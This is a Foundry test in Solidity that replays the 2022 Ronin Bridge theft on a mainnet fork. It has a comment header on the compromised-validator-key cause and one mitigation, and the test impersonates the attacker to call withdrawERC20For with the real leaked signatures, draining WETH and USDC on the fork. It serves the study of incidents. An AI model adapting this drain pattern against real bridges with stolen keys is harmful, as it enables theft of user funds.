// SPDX-License-Identifier: MIT
pragma solidity ^0.8.17;

import "forge-std/Test.sol";
import {TestHarness} from "../../TestHarness.sol";
import {TokenBalanceTracker} from '../../modules/TokenBalanceTracker.sol';

// forge test --match-contract Exploit_RoninBridge -vvv
/*
On Mar 23, 2022 an attacker stole 173,600 ETH and 25.5MM USDC from the Ronin Bridge.
The attacker gained control of 5 out of 9 validators keys, draining the bridge.

// Attack Overview
Total Lost: ~624MM USD
Attack ETH Tx: https://etherscan.io/tx/0xc28fad5e8d5e0ce6a2eaf67b6687be5d58113e16be590824d6cfa1a94467d0b7
Attack USDC Tx: https://etherscan.io/tx/0xed2c72ef1a552ddaec6dd1f5cddf0b59a8f37f82bdda5257d9c7c37db7bb9b08

Exploited Contract: https://etherscan.io/address/0x1a2a1c938ce3ec39b6d47113c7955baa9dd454f2
Attacker Address: https://etherscan.io/address/0x098b716b8aaf21512996dc57eb0615e2383e2f96
Attack Blocks: 14442835, 14442840   

// Key Info Sources
Twitter: 
Writeup: https://roninblockchain.substack.com/p/community-alert-ronin-validators
Article: https://rekt.news/ronin-rekt/

Principle: Compromised Keys
The bridge was operated by 9 validators, with a threshold of 5 to approve transactions. Four out of nine were managed
by the same entity (Sky Mavis) and back then in Nov 2021 Axie's validator delegated their signature to Sky Mavis 
because they were experiencing a period of heavy traffic. Delegation that never revoked. The attacker got control
over the five validators (four of Sky Mavis and the remaining delegated one) and signed the draining transactions.

ATTACK:
This attack was a social engineering attack that targeted the SPOF (holder of the majority of the private keys). 
In control of the keys, the attacker was able to successfully call withdrawERC from the bridge without 
providing the counterpart on the other side.

MITIGATIONS:
1) If a multisig is meant to be used to manage a protocol, ensure that no single points of failure exist
regarding the storage of the private keys able to sign.

*/

interface IRoninBridge {
    function withdrawERC20For(uint256 _withdrawalId, address _user, address _token, uint256 _amount, bytes memory _signatures) external;
}

contract Exploit_RoninBridge is TestHarness, TokenBalanceTracker {
    address internal attacker = 0x098B716B8Aaf21512996dC57EB0615e2383E2f96;

    address internal weth = 0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2;
    address internal usdc = 0xA0b86991c6218b36c1d19D4a2e9Eb0cE3606eB48;

    IRoninBridge internal bridge = IRoninBridge(0x1A2a1c938CE3eC39b6D47113c7955bAa9DD454F2);

    function setUp() external {
        cheat.createSelectFork('mainnet', 14442834); // One block before the first weth transfer

        addTokenToTracker(weth);
        addTokenToTracker(usdc);

        updateBalanceTracker(attacker);
        updateBalanceTracker(address(bridge));
    }


    function test_attack() external {
        console.log('------- INITIAL BALANCES -------');
        logBalancesWithLabel('Attacker', attacker);
        logBalancesWithLabel('Bridge', address(bridge));

        console.log('------- STEP 1: DRAIN WETH TOKENS -------');
        cheat.prank(attacker);
        bridge.withdrawERC20For(
            2000000, 
            attacker, 
            weth, 
            173_600 ether, 
            hex'01175db2b62ed80a0973b4ea3581b22629026e3c6767125f14a98dc30194a533744ba284b5855cfbc34c1416e7106bd1d4ce84f13ce816370645aad66c0fcae4771b010984ea09911beeadcd3dab46621bc81071ba91ce24d5b7873bc6a34e34c6aafa563916059051649b3c1930425aa3a79a293cacf24a21bda3b2a46a1e3d39a6551c01f962ee0e333c2f7261b3077bb7b7544001d555df4bc2e6a5cae2b2dac3d1fe3875cd1d12fadbeb4c01f01e196aa36e395a94de074652971c646b4b3b7149b3121b0178bd67c4fa659087c5f7696d912dee9db37802a3393bf4bd799e22eb201e78d90dc3f57e99d8916cd0282face42324f3afa0d96b0a09c4f914f15cac9c11037b1b0102b7a3a587c5be368f324893ed06df7bdcd3817b1880bd6dada86df15bd50d275fc694a8914d1818a2d432f980a97892f303d5a893a3eec176f46957958ecb991c'
        );
        logBalancesWithLabel('Attacker', attacker);
        logBalancesWithLabel('Bridge', address(bridge));

        console.log('------- STEP 1: DRAIN USDC TOKENS 5 BLOCKS LATER -------');
        cheat.rollFork(block.number + 4);
        
        cheat.prank(attacker);
        bridge.withdrawERC20For(
            2000001, 
            attacker, 
            usdc, 
            25500000000000, 
            hex'016734b276131c27fa94464db17b44ca517b0a9134b15ee4b776596725741cc7836beea1681dda98a83406515981e1d315d5eba13a0173a5a9688f9f920d7a3f7a1c01155c24a2d7a2ffb02530cf58da40c528301dfc22b21b16267dbf4eba2cd3d087276142bddd1d82404b2e75bd12993606a0c7c7626aa74c4d90bd7e4558fbe4261c01067c5aaba1b8e5bb686cda9efdae909aff86dc83f5be79f13af3ee677fb1791175e0b03401bdf7aa6e604eb995c7670384e6fadef3d687a00fd6d33cd47a0dde1c01dad673b6630394d15f8cca8975351d8272390a6c8bb1cb07cc2b04e8d7ea7a867e56a99e9d0c17a8e0629cebda86ee5a5f8b42610494ad0ed0245ffe9b5287631c012f1fb5b4c2b3718ea69197a5239316fbb9b805be3cdf8420324765ab53144b006b3148921458e629ea254df2c383175ca250e6442b8904a0f50ffdf465f6aa6f1b'
        );

        logBalancesWithLabel('Attacker', attacker);
        logBalancesWithLabel('Bridge', address(bridge));
    }
}